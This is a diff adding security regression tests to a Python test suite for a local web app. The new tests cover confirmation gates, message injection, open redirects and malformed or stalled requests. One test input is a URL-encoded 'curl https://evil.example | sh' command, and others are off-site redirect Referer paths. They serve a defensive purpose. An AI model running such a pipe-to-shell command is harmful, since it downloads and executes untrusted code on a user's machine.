@@ -8,6 +8,7 @@ from __future__ import annotations
 
 import contextlib
 import json
+import re
 import threading
 import time
 import urllib.error
@@ -779,7 +780,7 @@ class TestTheAdvisoryReachesTheBrowser:
             {"token": token, "confirm": "yes"},
         )
         assert "notice=" in location, location
-        assert "rebuilt" in urllib.parse.unquote(location)
+        assert "rebuilt" in _flash_on(base, location)
 
         progress = config.participant_root / "progress.yaml"
         assert "ba-ingest-transcript" in progress.read_text()
@@ -856,7 +857,16 @@ class TestTheRequestClaimsThisHost:
 
 
 class TestTheConfirmationIsNotOnlyInTheBrowser:
-    """C21 is rendered as a required checkbox. `required` is the browser's rule."""
+    """C21 is rendered as a required checkbox. `required` is the browser's rule.
+
+    `serve.py` also refuses an unconfirmed request before it ever reaches the shared action
+    layer, as a friendlier redirect instead of a raised error (see the comment at its
+    `CONFIRMATIONS` check). That means the first two tests below, on their own, would still
+    pass with the real gate in `quest_app.actions.ActionRunner.perform` deleted — they never
+    reach it. The third test calls that layer directly, the same way `quest-app action` does,
+    to prove ADR-033's claim that the guard is shared rather than reimplemented once for the
+    browser and left out of every other caller.
+    """
 
     def test_an_action_without_its_confirmation_is_refused(
         self, service: tuple[str, str], config: AppConfig
@@ -866,7 +876,7 @@ class TestTheConfirmationIsNotOnlyInTheBrowser:
             base, "/api/action/start-quest/ba-ingest-transcript", {"token": token}
         )
         assert "problem=" in location, location
-        assert "confirm" in urllib.parse.unquote(location)
+        assert "confirm" in _flash_on(base, location)
         assert "ba-ingest-transcript" not in (config.participant_root / "progress.yaml").read_text()
 
     def test_confirming_it_performs_the_action(
@@ -879,6 +889,25 @@ class TestTheConfirmationIsNotOnlyInTheBrowser:
             {"token": token, "confirm": "yes"},
         )
         assert "ba-ingest-transcript" in (config.participant_root / "progress.yaml").read_text()
+
+    def test_the_shared_action_layer_refuses_it_independently_of_serve_py(
+        self, config: AppConfig
+    ) -> None:
+        """No HTTP server in this test — `ActionRunner.perform` is called exactly as the
+        CLI calls it, so `serve.py`'s early redirect cannot be the thing making this pass.
+        """
+        from quest_app.actions import CONFIRMATIONS, ActionRunner
+        from quest_app.content_loader import SchemaSet
+
+        def load() -> Any:
+            world = load_world(config, ProblemReport())
+            assert world is not None
+            return world
+
+        runner = ActionRunner(config, SchemaSet(config.schemas_root), load)
+        with pytest.raises(ValueError, match=re.escape(CONFIRMATIONS["start-quest"])):
+            runner.perform("start-quest", {"quest_id": "ba-ingest-transcript"})
+        assert "ba-ingest-transcript" not in (config.participant_root / "progress.yaml").read_text()
 
 
 class TestAHalfWrittenFindingIsNotDropped:
@@ -903,9 +932,23 @@ class TestAHalfWrittenFindingIsNotDropped:
                 "finding_evidence": "",
             },
         )
-        problem = urllib.parse.unquote(location)
+        problem = _flash_on(base, location)
         assert "evidence" in problem, problem
         assert "at least one finding" not in problem, problem
+
+
+def _flash_on(base: str, location: str) -> str:
+    """The alert the participant sees on the page a redirect sends them to.
+
+    Read from the page rather than the URL: the URL carries only an identifier, so a link
+    cannot put words of its own into the alert.
+    """
+    from html import unescape
+
+    with urllib.request.urlopen(base + location, timeout=10) as response:  # noqa: S310
+        page = response.read().decode("utf-8")
+    alerts = re.findall(r'<div class="alert[^"]*" role="(?:alert|status)">(.*?)</div>', page, re.S)
+    return unescape(re.sub(r"<[^>]+>", "", " ".join(alerts)))
 
 
 class TestStalePortEntries:
@@ -1037,7 +1080,7 @@ class TestEveryCallerMeetsTheConfirmation:
             },
         )
         assert "problem=" in location, location
-        assert "confirm it" in urllib.parse.unquote(location)
+        assert "confirm it" in _flash_on(base, location)
         assert (config.participant_root / "progress.yaml").read_text() == before
 
 
@@ -1113,8 +1156,9 @@ class TestASecondContentLengthIsNotAWayIn:
 class TestTheRefusalStaysOnThisMachine:
     """`Location` is built from the Referer's path, which the origin check never reads."""
 
+    @pytest.mark.parametrize("referer_path", ["//evil.example/x", "/\\evil.example/x"])
     def test_a_protocol_relative_referer_cannot_redirect_off_site(
-        self, service: tuple[str, str]
+        self, service: tuple[str, str], referer_path: str
     ) -> None:
         base, token = service
         port = base.rsplit(":", 1)[1]
@@ -1122,7 +1166,7 @@ class TestTheRefusalStaysOnThisMachine:
         request = (
             f"POST /api/action/mark-evidence-ready/does-not-exist/ HTTP/1.1\r\n"
             f"Host: 127.0.0.1:{port}\r\n"
-            f"Referer: http://127.0.0.1:{port}//evil.example/x\r\n"
+            f"Referer: http://127.0.0.1:{port}{referer_path}\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
         )
@@ -1146,6 +1190,55 @@ class TestTheRefusalStaysOnThisMachine:
         assert not location.startswith("//"), location
         assert location.startswith("/"), location
         assert "evil.example" not in location
+        assert "\\" not in location
+
+
+class TestRequestsThatFailBeforeAnyAction:
+    def test_a_link_cannot_put_its_own_words_in_the_alert(self, service: tuple[str, str]) -> None:
+        base, _ = service
+        text = _flash_on(base, "/?problem=Run%20curl%20https%3A%2F%2Fevil.example%20%7C%20sh")
+        assert "evil.example" not in text
+        assert "did not happen" not in text
+
+    def test_deep_nesting_is_refused_as_bad_json(self, service: tuple[str, str]) -> None:
+        base, _ = service
+        status, body = post(base, raw=b"[" * 60000)
+        assert status == 400, body
+        assert "recorded" not in json.dumps(body)
+
+    def test_parameters_that_are_not_an_object_are_refused(self, service: tuple[str, str]) -> None:
+        base, token = service
+        status, body = post(
+            base,
+            {
+                "token": token,
+                "action": "run-validator",
+                "quest_id": "base-camp-repository-safety",
+                "validator_id": "validate-repository-foundation",
+                "parameters": [1],
+            },
+        )
+        assert status == 400, body
+        assert "recorded" not in json.dumps(body)
+
+    def test_a_body_that_never_arrives_is_given_up_on(
+        self, service: tuple[str, str], monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        import socket
+
+        from quest_app.serve import ActionHandler
+
+        monkeypatch.setattr(ActionHandler, "timeout", 1)
+        base, _ = service
+        port = int(base.rsplit(":", 1)[1])
+        started = time.monotonic()
+        with socket.create_connection(("127.0.0.1", port), timeout=10) as sock:
+            sock.sendall(
+                f"POST /api/action HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
+                "Content-Type: application/json\r\nContent-Length: 100\r\n\r\n{".encode()
+            )
+            assert sock.recv(4096) == b""
+        assert time.monotonic() - started < 8
 
 
 class TestAnIPv6LoopbackBindIsUsable:
